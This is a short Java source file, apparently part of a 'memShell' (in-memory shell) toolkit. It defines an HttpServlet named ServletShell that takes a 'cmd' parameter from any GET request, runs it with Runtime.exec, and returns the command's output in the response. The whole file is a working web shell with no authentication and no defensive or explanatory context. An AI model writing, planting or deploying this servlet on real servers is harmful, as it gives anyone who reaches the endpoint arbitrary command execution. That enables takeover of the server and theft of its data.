package memShell;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

public class ServletShell extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null){
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            int i = 0;
            byte[] bytes = new byte[1024];
            while ((i = inputStream.read(bytes)) != -1){
                resp.getWriter().write(new String(bytes,0,i));
                resp.getWriter().write("\r\n");
            }
        }
    }
}
